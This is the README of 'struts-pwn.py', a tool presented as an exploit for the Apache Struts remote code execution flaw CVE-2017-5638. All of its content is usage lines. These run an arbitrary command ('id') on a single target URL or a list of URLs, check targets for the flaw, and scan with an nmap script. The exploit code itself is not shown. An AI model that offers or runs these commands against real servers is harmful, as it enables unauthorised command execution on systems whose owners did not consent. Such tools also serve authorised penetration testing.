# Apache-Struts
### An exploit for Apache Struts CVE-2017-5638 ###


# **Usage** #

## Testing a single URL. ##
`python struts-pwn.py --url 'http://example.com/struts2-showcase/index.action' -c 'id'`
# **Nmap Recong** #
`nmap -p <port> --script http-vuln-cve2017-5638 <target>'`


## Testing a list of URLs. ##
`python struts-pwn.py --list 'urls.txt' -c 'id'`

## Checking if the vulnerability exists against a single URL. ##
`python struts-pwn.py --check --url 'http://example.com/struts2-showcase/index.action'`

## Checking if the vulnerability exists against a list of URLs. ##
`python struts-pwn.py --check --list 'urls.txt'`
